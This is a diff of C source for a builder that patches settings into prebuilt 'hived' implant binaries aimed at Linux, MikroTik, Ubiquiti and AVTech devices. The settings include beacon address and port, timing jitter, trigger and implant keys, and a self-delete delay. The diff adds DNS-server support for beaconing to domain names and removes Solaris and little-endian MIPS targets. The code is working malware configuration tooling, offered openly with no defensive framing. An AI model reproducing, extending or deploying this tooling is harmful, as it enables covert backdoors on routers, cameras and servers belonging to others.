@@ -12,7 +12,6 @@
 #include <time.h>
 #include "trigger_protocols.h"
 
-//#include "_unpatched_solaris_x86.h"
 #include "_unpatched_linux_x86.h"
 #include "_unpatched_mikrotik_x86.h"
 #include "_unpatched_mikrotik_mips.h"
@@ -27,20 +26,16 @@
 #include "polarssl/config.h"
 #include "polarssl/sha1.h"
 
-//#define HIVE_SOLARIS_X86_FILE				"hived-solaris-x86-PATCHED"
 #define HIVE_LINUX_X86_FILE					"hived-linux-x86-PATCHED"
 #define HIVE_MIKROTIK_X86_FILE				"hived-mikrotik-x86-PATCHED"
 #define HIVE_MIKROTIK_MIPS_FILE				"hived-mikrotik-mips-PATCHED"
-//#define HIVE_MIKROTIK_MIPSEL_FILE			"hived-mikrotik-mipsel-PATCHED"
 #define HIVE_MIKROTIK_PPC_FILE				"hived-mikrotik-ppc-PATCHED"
 #define HIVE_UBIQUITI_MIPS_FILE				"hived-ubiquiti-mips-PATCHED"
 #define HIVE_AVTECH_ARM_FILE				"hived-avtech-arm-PATCHED"
 
-//#define HIVE_SOLARIS_X86_UNPATCHED 		"hived-solaris-x86-UNpatched"
 #define HIVE_LINUX_X86_UNPATCHED			"hived-linux-x86-UNpatched"
 #define HIVE_MIKROTIK_X86_UNPATCHED			"hived-mikrotik-x86-UNpatched"
 #define HIVE_MIKROTIK_MIPS_UNPATCHED		"hived-mikrotik-mips-UNpatched"
-//#define HIVE_MIKROTIK_MIPSEL_UNPATCHED	"hived-mikrotik-mipsel-UNpatched"
 #define HIVE_MIKROTIK_PPC_UNPATCHED			"hived-mikrotik-ppc-UNpatched"
 #define HIVE_UBIQUITI_MIPS_UNPATCHED		"hived-ubiquiti-mips-UNpatched"
 #define HIVE_AVTECH_ARM_UNPATCHED			"hived-avtech-arm-UNpatched"
@@ -63,39 +58,39 @@
 #define DEFAULT_BEACON_JITTER		3					// Default value is 3, range is from 0<=jitter<=30
 #define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60	// Default value is 60 days...
 
-struct cl_args {
-	unsigned int 	sig;
-	unsigned int 	beacon_port;
-	unsigned int 	host_len;
-	char 			beacon_ip[256];
-	char			iface[16];
-	unsigned char	idKey[ID_KEY_HASH_SIZE];
+typedef enum {FALSE=0, TRUE} boolean;
+
+struct __attribute__ ((packed)) cl_args {
+	unsigned int	sig;
+	unsigned int	beacon_port;
+	unsigned int	trigger_delay;
 	unsigned long	init_delay;
 	unsigned int	interval;
-	unsigned int	trigger_delay;
 	unsigned int	jitter;
-	time_t			delete_delay;
-	char			sdpath[SD_PATH_LENGTH];
+	unsigned long	delete_delay;
 	unsigned int	patched;
-} __attribute__ ((packed));
-
-struct cl_args args = {
-		SIG_HEAD,
-		DEFAULT_BEACON_PORT,
-		0,
-		{0},
-		{0},
-		{0},
-		DEFAULT_INITIAL_DELAY,
-		DEFAULT_BEACON_INTERVAL,
-		DEFAULT_TRIGGER_DELAY,
-		DEFAULT_BEACON_JITTER,
-		DEFAULT_SELF_DELETE_DELAY,
-		"/var",
-		1
+	unsigned char   idKey[ID_KEY_HASH_SIZE];
+	char			sdpath[SD_PATH_LENGTH];
+	char			beacon_ip[256];
+	char			dns[2][16];
 };
 
-typedef enum {FALSE=0, TRUE} boolean;
+struct cl_args	args = {
+						SIG_HEAD,
+						DEFAULT_BEACON_PORT,
+						DEFAULT_TRIGGER_DELAY,
+						DEFAULT_INITIAL_DELAY,
+						DEFAULT_BEACON_INTERVAL,
+						DEFAULT_BEACON_JITTER,
+						DEFAULT_SELF_DELETE_DELAY,
+						1,
+						{0},
+						{0},
+						{0},
+						{{0}}
+};
+
+//********************************************************************************
 
 //define displaySha1Hash function
 void printSha1Hash(FILE *file, char *tag, unsigned char *sha1Hash)
@@ -110,7 +105,6 @@ void printSha1Hash(FILE *file, char *tag, unsigned char *sha1Hash)
 
 //********************************************************************************
 int user_instructions(void);
-//int local_gen_keys( char *pubkeyfile, char *privkeyfile, int keySz );
 int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct cl_args patched_args);
 int non_patch(char *filename, unsigned char *hexarray, unsigned int arraylen);
 
@@ -126,9 +120,9 @@ int usage(char **argv)
 	fprintf(stdout, "    %s-K <idKeyFile>%s     - ID key filename (maximum 100 character path)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-k <ID Key Phrase>%s - ID key phrase (maximum 100 character string)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-j <b_jitter>%s      - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN, RESET);
-//	fprintf(stdout, "    %s-I <interface>%s     - Solaris Only - interface to listen for triggers\n", GREEN, RESET);
 	fprintf(stdout, "    %s-P <file path>%s     - (optional) self-delete control/log file directory path [default: /var]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-p <port>%s          - (optional) beacon port [default: 443]\n", GREEN, RESET);
+	fprintf(stdout, "    %s-S <address>%s       - IP address of the DNS server(s) (required if beacon address a is domain name\n", GREEN, RESET);
 	fprintf(stdout, "    %s-s <sd_delay>%s      - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-t <t_delay>%s       - (optional) delay between trigger received & callback +/- 30 sec (in seconds) [default: 60 sec]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-m <OS>%s            - (optional) target OS [default: 'all'].  options:\n", GREEN, RESET);
@@ -136,10 +130,8 @@ int usage(char **argv)
 	fprintf(stdout, "                             * 'raw' - all unpatched\n");
 	fprintf(stdout, "                             * 'mt-x86'\n");
 	fprintf(stdout, "                             * 'mt-mips'\n");
-//	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
 	fprintf(stdout, "                             * 'mt-ppc'\n");
 	fprintf(stdout, "                             * 'linux-x86'\n");
-//	fprintf(stdout, "                             * 'sol-x86'\n");
 	fprintf(stdout, "                             * 'ub-mips'\n");
 	fprintf(stdout, "                             * 'avt-arm'\n");
 	fprintf(stdout, "    %s[-h ]%s              - print this usage\n\n", GREEN, RESET);
@@ -170,55 +162,35 @@ int RandFill(char *buf, int size)
 //********************************************************************************
 int main(int argc, char **argv)
 {
-	int optval;
-	int linux_x86 = 0;							// Linux x86
-//	int solaris_x86 = 0;						// Solaris x86
-	int mikrotik_x86 = 0;						// MikroTik x86
-	int mikrotik_mips = 0;						// MikroTik MIPS Big Endian
-//	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
-	int mikrotik_ppc = 0;						// MikroTik PowerPC [Big Endian]
-	int ubiquiti_mips = 0;						// Ubiquiti MIPS Big Endian
-	int avtech_arm = 0;							// AVTech ARM
-	int raw = 0;								// unpatched versions
-	char *host = (char *) NULL;					// cached hostname for user confirmation message
-	FILE *implantIDFile;						// Used to save implant keys and subsequent sha1 hashes...
-	time_t currentTime;							// Time stamp for ID key generation
-	struct tm *idKeyTime;						// Pointer to the ID key generation data structure
-	unsigned char implantKey[ID_KEY_HASH_SIZE];
-	unsigned char triggerKey[ID_KEY_HASH_SIZE];
-	boolean keyed = FALSE;						// Boolean to verify that a key was entered
+	int				optval;
+	int				linux_x86 = 0;					// Linux x86
+	int 			mikrotik_x86 = 0;				// MikroTik x86
+	int 			mikrotik_mips = 0;				// MikroTik MIPS Big Endian
+	int 			mikrotik_ppc = 0;				// MikroTik PowerPC [Big Endian]
+	int 			ubiquiti_mips = 0;				// Ubiquiti MIPS Big Endian
+	int 			avtech_arm = 0;					// AVTech ARM
+	int 			raw = 0;						// unpatched versions
 
-	args.sig = SIG_HEAD;
+	char 			*host = (char *) NULL;			// cached hostname for user confirmation message
+	FILE 			*implantIDFile;					// Used to save implant keys and subsequent sha1 hashes...
+	time_t 			currentTime;					// Time stamp for ID key generation
+	struct tm 		*idKeyTime;						// Pointer to the ID key generation data structure
+	unsigned char	implantKey[ID_KEY_HASH_SIZE];
+	unsigned char	triggerKey[ID_KEY_HASH_SIZE];
+	boolean			keyed = FALSE;					// Boolean to verify that a key was entered
 
 	implantKey[0] = '\0';
+	args.sig = SIG_HEAD;
 
-	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:P:p:s:t:")) != -1) {
+	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:P:p:S:s:t:")) != -1) {
 		switch (optval) {
 
 		case 'a':	// Hostname / IP address of beacon LP
-			if (strlen(optarg) > sizeof(args.beacon_ip)) {
+			if (strlen(optarg) >= sizeof(args.beacon_ip)) {
 				printf(" ERROR: Hostname or IP exceeds %d character limit\n", (int)sizeof(args.beacon_ip));
 				return -1;
 			}
-/*
-			if ( inet_aton( optarg, &addr_check ) == 0 )
-			{
-			    printf( " ERROR: invalid IP address specified\n" );
-			    return -1;
-			}
-*/
-			// save pointer to the unmodified user input.  this is echo'd back to user
-			host = optarg;
-
-			// fill/initialize structure with random data
-			RandFill(args.beacon_ip, sizeof(args.beacon_ip));
-
-			args.host_len = strlen(optarg);
-			memcpy(args.beacon_ip, optarg, strlen(optarg));
-
-			// copy string representation of hostname or IP into the structure
-			memcpy(args.beacon_ip, optarg, args.host_len);
-
+			host = optarg;	// Save domain name or IP address for processing below
 			break;
 
 		case 'd':	// initial delay
@@ -228,18 +200,6 @@ int main(int argc, char **argv)
 		case 'h':	// Help
 			usage(argv);
 			break;
-
-#if 0	// Solairis (deprecated)
-		case 'I':	// interface to listen for triggers. only needed for solaris
-			if (strlen(optarg) > sizeof(args.iface)) {
-				printf(" ERROR: Name of interface is too long\n");
-				return -1;
-			}
-			// copy string representation of interface name into patched structure
-			memcpy(args.iface, optarg, strlen(optarg));
-
-			break;
-#endif
 
 		case 'i':	// beacon interval
 			args.interval = (unsigned int) atoi(optarg) * 1000;
@@ -348,19 +308,14 @@ int main(int argc, char **argv)
 				if (OPTMATCH(optarg, "mt-mips"))	{mikrotik_mips = 1;		break;}
 				if (OPTMATCH(optarg, "mt-mipsbe"))	{mikrotik_mips = 1;		break;}
 				if (OPTMATCH(optarg, "mt-x86"))		{mikrotik_x86 = 1;		break;}
-//				if (OPTMATCH(optarg, "sol-x86"))	{solaris_x86 = 1;		break;}
 				if (OPTMATCH(optarg, "linux-x86"))	{linux_x86 = 1;			break;}
-//				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
-//				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
 				if (OPTMATCH(optarg, "ub-mips"))	{ubiquiti_mips = 1;		break;}
-				if (OPTMATCH(optarg, "avt-mips"))	{avtech_arm = 1;		break;}
+				if (OPTMATCH(optarg, "avt-arm"))	{avtech_arm = 1;		break;}
 				if (OPTMATCH(optarg, "raw"))		{raw = 1;				break;}
 
 				if (OPTMATCH(optarg, "all"))		{linux_x86 = 1,
-//													solaris_x86 = 1,
 													mikrotik_x86 = 1,
 													mikrotik_mips = 1,
-//													mikrotik_mipsel = 1,
 													mikrotik_ppc = 1,
 													ubiquiti_mips = 1;
 													avtech_arm = 1;
@@ -372,7 +327,7 @@ int main(int argc, char **argv)
 
 		case 'P':	// Set path for self-delete control and log files
 			if (strlen(optarg) + 9 < SD_PATH_LENGTH) {	// Make sure array is large enough for filename, '/' and '\0'
-				strcpy(args.sdpath, optarg);		// Copy the path from the command line
+				strcpy(args.sdpath, optarg);			// Copy the path from the command line
 			} else {
 				fprintf(stderr, "ERROR: Directory path is too long (maximum 120 characters)");
 				return -1;
@@ -384,6 +339,39 @@ int main(int argc, char **argv)
 			if (args.beacon_port < 1 || args.beacon_port > 65535) {
 				printf("ERROR: Invalid port number for beacon\n");
 				return -1;
+			}
+			break;
+
+		case 'S':	// DNS Server address(es) -- a comma separated list of up to two dotted quad addresses
+			{
+				char *dns;
+				char *address_list;
+
+				address_list = strdup(optarg);
+
+				// Get 1st DNS server address and validate its length
+				if ((dns = strtok(address_list, ","))) {
+					if (strlen(dns) > 16) {
+						fprintf(stderr, "ERROR: DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
+						return -1;
+					}
+					memcpy(args.dns[0], dns, strlen(dns));
+				} else {
+					args.dns[0][0] = '\0';
+					fprintf(stderr, "Missing DNS address\n");
+					return -1;
+				}
+
+				// Get 2nd DNS server address if it was entered and validate its length
+				if ((dns = strtok(NULL, ","))) {
+					if (strlen(dns) > 16) {
+						fprintf(stderr, "ERROR: Second DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
+						return -1;
+					}
+					memcpy(args.dns[1], dns, strlen(dns));
+				} else
+					args.dns[1][0] = '\0';
+				free(address_list);
 			}
 			break;
 
@@ -408,6 +396,34 @@ int main(int argc, char **argv)
 		return -1;
 	}
 
+	{	// Validate IP addressing - must have a valid IP or a domain name
+		uint32_t	beaconIPaddr = 0;
+
+		if (args.init_delay > 0) {			// Beacons enabled
+
+			if (args.beacon_port == 0) {
+				DLX(1, printf("No Beacon Port Specified!\n"));
+				DLX(1, printUsage(argv[0]));
+			}
+
+			// Obtain Beacon IP address
+			if (strlen(host) == 0) {
+					DLX(1, printf("No Beacon IP address specified!\n"));
+					DLX(1, printUsage(argv[0]));
+					return -1;
+			}
+
+			RandFill(args.beacon_ip, sizeof(args.beacon_ip));	// Fill/initialize field with random data
+			strcpy(args.beacon_ip, host);						// Copy string representation of hostname or IP into the field including the null byte
+			if (inet_pton(AF_INET, args.beacon_ip, &beaconIPaddr) <= 0) {		// Determine if beacon IP is a valid address
+				if (args.dns[0] == NULL) {										// If not, verify that a DNS server address was specified
+					DLX(1, printf("Beacon IP was specified as a domain name, but no valid DNS server address was specified to resolve the name!\n"));
+					return -1;
+				}
+			}
+		}
+	}
+
 	if (raw == 0) {
 		if ((args.beacon_port == 0) || (args.interval == 0) || (strlen(args.beacon_ip) == 0)) {
 			printf("\n");
@@ -415,7 +431,7 @@ int main(int argc, char **argv)
 			usage(argv);
 			return -1;
 		}
-		//Enforce 0<=jitter<=30 jitter requirement.
+		// Enforce 0 <= jitter <= 30 requirement.
 		if (((int) args.jitter < 0) || (args.jitter > 30)) {
 			printf("\n");
 			printf("    %sError: Incorrect options%s\n", RED, RESET);
@@ -424,42 +440,27 @@ int main(int argc, char **argv)
 		}
 
 		if (	(linux_x86 == 0) &&
-//				(solaris_x86 == 0) &&
 				(mikrotik_x86 == 0) &&
 				(mikrotik_mips == 0) && (mikrotik_ppc == 0) &&
-//				(mikrotik_mipsel == 0) &&
 				(ubiquiti_mips == 0) &&
 				(avtech_arm == 0)
 				) {	// no OS was selected, so default is to build all
 					linux_x86 = 1;
-//					solaris_x86 = 1;
 					mikrotik_x86 = 1;
 					mikrotik_mips = 1;
-//					mikrotik_mipsel = 1;
 					mikrotik_ppc = 1;
 					ubiquiti_mips = 1;
 					avtech_arm = 1;
 		}
 
-#if 0	// Solaris deprecated
-		if (solaris_x86 == 1) {	// Solaris must have the interface patched in
-			if (strlen(args.iface) == 0) {
-				printf("\n");
-				printf("    ERROR: Incomplete options. %sSolaris%s requires an interface be selected.\n", RED, RESET);
-				usage(argv);
-				return -1;
-			}
-		}
-#endif
-
 		printf("\n");
 		printf("  This application will generate PATCHED files with the following values:\n\n");
 		printf("\t%32s: %-s\n", "Beacon Server IP address", host);
 		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
-		printf("\t%32s: ", "Trigger Key");
-		printSha1Hash(stdout, "", triggerKey); printf("\n");
-		printf("\t%32s: ", "Implant Key");
-		printSha1Hash(stdout, "", implantKey); printf("\n");
+		printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
+		printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
+		printf("\t%32s: ", "Trigger Key"); printSha1Hash(stdout, "", triggerKey); printf("\n");
+		printf("\t%32s: ", "Implant Key"); printSha1Hash(stdout, "", implantKey); printf("\n");
 		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
 		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval / 1000);
 		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
@@ -467,87 +468,45 @@ int main(int argc, char **argv)
 		printf("\t%32s: %-s\n", "Self Delete Control File Path", args.sdpath);
 		printf("\t%32s: %-d\n", "Trigger Delay (+/-30 sec)", args.trigger_delay / 1000);
 	}
-
-#if 0 // Solaris deprecated
-	if (solaris_x86 == 1) {
-		printf("   . Listening Interface         -> %s     (Solaris Only)\n", args.iface);
-	}
-#endif
-
-	printf("\n");
-	printf("  Target Operating Systems:\n");
+;
+	printf("\n  Target Operating Systems:\n");
 
 	// little endian systems targets
 
-	if (linux_x86 == 1 || raw == 1) {
-		printf("   . Linux/x86\n");
-	}
-
-#if 0 // Solaris deprecated
-	if (solaris_x86 == 1 || raw == 1) {
-		printf("   . Solaris/x86\n");
-	}
-#endif
-
-	if (mikrotik_x86 == 1 || raw == 1) {
-		printf("   . MikroTik/x86\n");
-	}
-
-//	if (mikrotik_mipsel == 1 || raw == 1) {
-//		printf("   . MikroTik/MIPS (little endian)\n");
-//	}
-	// beginning of big endian targets
-
-	if (mikrotik_mips == 1 || raw == 1) {
-		printf("   . MikroTik/MIPS\n");
-	}
-
-	if (mikrotik_ppc == 1 || raw == 1) {
-		printf("   . MikroTik/PPC\n");
-	}
-
-	if (ubiquiti_mips == 1 || raw == 1) {
-		printf("   . Ubiquiti/MIPS\n");
-	}
-
-	if (avtech_arm == 1 || raw == 1) {
-		printf("   . AVTech/ARM\n");
-	}
+	if (linux_x86 == 1 || raw == 1)		printf("   . Linux/x86\n");
+	if (mikrotik_x86 == 1 || raw == 1)	printf("   . MikroTik/x86\n");
+	if (mikrotik_mips == 1 || raw == 1)	printf("   . MikroTik/MIPS\n");
+	if (mikrotik_ppc == 1 || raw == 1)	printf("   . MikroTik/PPC\n");
+	if (ubiquiti_mips == 1 || raw == 1)	printf("   . Ubiquiti/MIPS\n");
+	if (avtech_arm == 1 || raw == 1)	printf("   . AVTech/ARM\n");
 
 	if (raw == 0) {
+		cl_string((unsigned char *) args.dns[0], sizeof(args.dns[0]));
+		cl_string((unsigned char *) args.dns[1], sizeof(args.dns[1]));
 		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
-		cl_string((unsigned char *) args.iface, sizeof(args.iface));
 		cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));
 	}
 
-//	remove(HIVE_SOLARIS_X86_FILE);
 	remove(HIVE_LINUX_X86_FILE);
 	remove(HIVE_MIKROTIK_X86_FILE);
 	remove(HIVE_MIKROTIK_MIPS_FILE);
-//	remove(HIVE_MIKROTIK_MIPSEL_FILE);
 	remove(HIVE_MIKROTIK_PPC_FILE);
 	remove(HIVE_UBIQUITI_MIPS_FILE);
 	remove(HIVE_AVTECH_ARM_FILE);
 
-//	remove(HIVE_SOLARIS_X86_UNPATCHED);
 	remove(HIVE_LINUX_X86_UNPATCHED);
 	remove(HIVE_MIKROTIK_X86_UNPATCHED);
 	remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
-//	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
 	remove(HIVE_MIKROTIK_PPC_UNPATCHED);
 	remove(HIVE_UBIQUITI_MIPS_UNPATCHED);
 	remove(HIVE_AVTECH_ARM_UNPATCHED);
 
 	sleep(1);
 
-//    local_gen_keys( PUBKEYFILE, PRIVKEYFILE, KEY_SIZE );
-
 	if (raw == 1) {
 		printf("\n");
 		non_patch(HIVE_LINUX_X86_UNPATCHED, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len);
-//		non_patch(HIVE_SOLARIS_X86_UNPATCHED, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len);
 		non_patch(HIVE_MIKROTIK_X86_UNPATCHED, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len);
-//		non_patch(HIVE_MIKROTIK_MIPSEL_UNPATCHED, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len);
 		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
 		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
 		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
@@ -557,41 +516,12 @@ int main(int argc, char **argv)
 // is changed to Big Endian.  Since these changes are made in a global variable used by all
 // parsers, check for Little Endian variants first and the Big Endian possibilities next.
 
-	if (linux_x86 == 1) {
-		patch(HIVE_LINUX_X86_FILE, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len, args);
-	}
-
-#if 0	// Solaris no longer supported
-	if (solaris_x86 == 1) {
-		patch(HIVE_SOLARIS_X86_FILE, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len, args);
-	}
-#endif
-
-	if (mikrotik_x86 == 1) {
-		patch(HIVE_MIKROTIK_X86_FILE, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len, args);
-	}
-
-	if (avtech_arm == 1) {
-		patch(HIVE_AVTECH_ARM_FILE, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len, args);
-	}
-
-#if 0	// MikroTik little-endian no longer supported
-	if (mikrotik_mipsel == 1) {
-		patch(HIVE_MIKROTIK_MIPSEL_FILE, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len, args);
-	}
-#endif
-
-	if (mikrotik_ppc == 1) {
-		patch(HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args);
-	}
-
-	if (mikrotik_mips == 1) {
-		patch(HIVE_MIKROTIK_MIPS_FILE, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len, args);
-	}
-
-	if (ubiquiti_mips == 1) {
-		patch(HIVE_UBIQUITI_MIPS_FILE, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len, args);
-	}
+	if (linux_x86 == 1)		patch(HIVE_LINUX_X86_FILE, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len, args);
+	if (mikrotik_x86 == 1)	patch(HIVE_MIKROTIK_X86_FILE, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len, args);
+	if (avtech_arm == 1)	patch(HIVE_AVTECH_ARM_FILE, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len, args);
+	if (mikrotik_ppc == 1)	patch(HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args);
+	if (mikrotik_mips == 1)	patch(HIVE_MIKROTIK_MIPS_FILE, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len, args);
+	if (ubiquiti_mips == 1)	patch(HIVE_UBIQUITI_MIPS_FILE, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len, args);
 	printf("\n");
 
 	return 0;
@@ -664,18 +594,11 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 
 	printf("  SIG_HEAD found at offset 0x%x for %s\n", (int)(--p - hexarray), filename);
 
-//      memcpy( p + sizeof( SIG_HEAD ), keybuffer, 128 );
 	if (big_endian == 0) {
 		memcpy(p, &copy_of_args, sizeof(struct cl_args));
 	} else if (big_endian == 1) {
 		copy_of_args.sig = htonl(copy_of_args.sig);
 		copy_of_args.beacon_port = htonl(copy_of_args.beacon_port);
-		copy_of_args.host_len = htonl(copy_of_args.host_len);
-
-		//How do I convert array of sha1 hash into network byte order for different endian type of machines...
-		memcpy(copy_of_args.idKey, copy_of_args.idKey, 20 * sizeof(unsigned char));
-		//copy_of_args.idKey = htonl( &copy_of_args.idKey );
-
 		copy_of_args.init_delay = htonl(copy_of_args.init_delay);
 		copy_of_args.interval = htonl(copy_of_args.interval);
 		copy_of_args.jitter = htonl(copy_of_args.jitter);
